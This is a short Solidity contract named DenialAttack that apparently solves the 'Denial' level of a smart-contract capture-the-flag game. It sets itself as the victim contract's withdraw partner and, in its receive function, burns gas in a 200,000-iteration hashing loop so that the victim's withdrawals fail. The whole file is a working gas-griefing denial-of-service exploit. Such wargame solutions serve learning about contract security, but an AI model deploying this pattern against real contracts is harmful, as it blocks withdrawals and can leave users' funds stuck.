// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import { Denial } from "./Denial.sol";


contract DenialAttack{
    Denial victim;

    constructor(address _v) {
        victim = Denial(payable(_v));
        victim.setWithdrawPartner(address(this));
    }

    receive() external payable {
        for (uint256 i = 0; i < 200000; i++) {
            // Some expensive operation
            keccak256(abi.encodePacked(block.timestamp, block.number, i));
        }
    }
}